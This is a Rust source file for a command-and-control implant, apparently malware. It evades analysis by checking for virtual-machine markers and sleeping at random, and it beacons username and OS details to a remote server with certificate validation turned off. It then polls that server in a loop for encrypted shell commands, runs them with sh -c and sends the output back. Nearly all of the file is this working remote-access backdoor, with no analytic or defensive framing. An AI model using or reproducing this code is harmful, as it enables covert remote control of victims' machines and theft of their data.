use reqwest::blocking::Client;
use reqwest::Certificate;
use std::fs;
use std::process::Command;
use std::time::Duration;
use aes_gcm::{Aes256Gcm, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use base64::{engine::general_purpose, Engine as _};
use std::thread;
use std::time::Duration as StdDuration;
use rand::Rng;
use std::env;

fn encrypt_data(key_bytes: &[u8], nonce_bytes: &[u8], data: &[u8]) -> Vec<u8> {
    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(key_bytes);
    let cipher = Aes256Gcm::new(key);
    cipher.encrypt(Nonce::from_slice(nonce_bytes), data).expect("encryption failure!")
}

fn decrypt_data(key_bytes: &[u8], nonce_bytes: &[u8], data: &[u8]) -> Result<Vec<u8>, aes_gcm::Error> {
    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(key_bytes);
    let cipher = Aes256Gcm::new(key);
    cipher.decrypt(Nonce::from_slice(nonce_bytes), data)
}

fn collect_info() -> String {
    let output = Command::new("whoami").output().unwrap();
    let username = String::from_utf8_lossy(&output.stdout);
    let output = Command::new("uname").arg("-a").output().unwrap();
    let os_info = String::from_utf8_lossy(&output.stdout);
    format!("User: {}\nOS: {}", username.trim(), os_info.trim())
}

fn run_command(cmd: &str) -> String {
    match Command::new("sh").arg("-c").arg(cmd).output() {
        Ok(output) => String::from_utf8_lossy(&output.stdout).to_string(),
        Err(_) => "Command failed".to_string(),
    }
}

fn anti_analysis_checks() -> bool {
    let suspicious_env_vars = vec!["VBOX", "VMWARE", "KVM", "QEMU"];
    for (key, value) in env::vars() {
        for suspect in &suspicious_env_vars {
            if key.contains(suspect) || value.contains(suspect) {
                return true;
            }
        }
    }
    false
}

fn random_sleep() {
    let delay = rand::thread_rng().gen_range(5..=15);
    thread::sleep(StdDuration::from_secs(delay));
}

fn main() {
    if anti_analysis_checks() {
        println!("Environment analysis detected. Exiting.");
        return;
    }

    let key = b"anexampleverysecurekey1234567890"; // exactly 32 bytes
    let nonce = b"123456789012"; // exactly 12 bytes
    let cert = fs::read("ca.crt").expect("CA cert not found");
    let ca = Certificate::from_pem(&cert).unwrap();

    let client = Client::builder()
        .add_root_certificate(ca)
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()
        .unwrap();

    let sys_info = collect_info();
    let encrypted = encrypt_data(key, nonce, sys_info.as_bytes());
    let encoded = general_purpose::STANDARD.encode(&encrypted);

    let res = client.post("https://<SERVER_IP>:5000/beacon")
        .body(encoded)
        .send();

    if let Err(e) = res {
        eprintln!("Initial beacon failed: {}", e);
        return;
    }

    loop {
        let poll = client.get("https://10.0.0.26:5000/cmd").send();
        if let Ok(response) = poll {
            if let Ok(enc_cmd) = response.text() {
                if enc_cmd.is_empty() {
                    random_sleep();
                    continue;
                }

                match general_purpose::STANDARD.decode(enc_cmd) {
                    Ok(cmd_bytes) => {
                        match decrypt_data(key, nonce, &cmd_bytes) {
                            Ok(decrypted_cmd) => {
                                match String::from_utf8(decrypted_cmd) {
                                    Ok(cmd) => {
                                        println!("Received command: {}", cmd);
                                        let result = run_command(&cmd);
                                        println!("Command output: {}", result);
                                        let enc_result = encrypt_data(key, nonce, result.as_bytes());
                                        let result_b64 = general_purpose::STANDARD.encode(&enc_result);
                                        if let Err(e) = client.post("https://10.0.0.26:5000/result")
                                            .body(result_b64)
                                            .send()
                                        {
                                            eprintln!("Failed to send result: {}", e);
                                        }
                                    }
                                    Err(e) => eprintln!("UTF-8 conversion failed: {}", e),
                                }
                            }
                            Err(e) => eprintln!("Decryption failed: {}", e),
                        }
                    }
                    Err(e) => eprintln!("Base64 decoding failed: {}", e),
                }
            }
        }
        random_sleep();
    }
}
